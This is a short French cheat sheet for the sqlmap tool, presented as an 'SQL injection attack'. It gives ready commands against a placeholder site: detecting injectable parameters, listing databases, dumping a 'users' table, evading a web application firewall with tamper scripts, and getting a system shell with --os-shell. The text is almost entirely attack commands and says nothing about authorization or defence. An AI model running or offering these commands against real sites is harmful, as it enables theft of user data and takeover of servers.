🛠 Attaque : Injection SQL
📌 Description : Automatise l'exploitation de vulnérabilités SQL dans les bases de données.
🔑 Commandes clés :
# Détecter une injection SQL
sqlmap -u "http://site.com/page?id=1" --batch

# Extraire les bases de données
sqlmap -u "http://site.com/page?id=1" --dbs

# Extraire une table spécifique
sqlmap -u "http://site.com/page?id=1" -D dbname -T users --dump

# Bypass WAF
sqlmap -u "http://site.com/page?id=1" --tamper=space2comment

⚙️ Options utiles :
--dbs : Lister les bases de données.
--dump : Extraire les données d’une table.
--os-shell : Obtenir un shell système.
--tamper : Contourner les protections (WAF).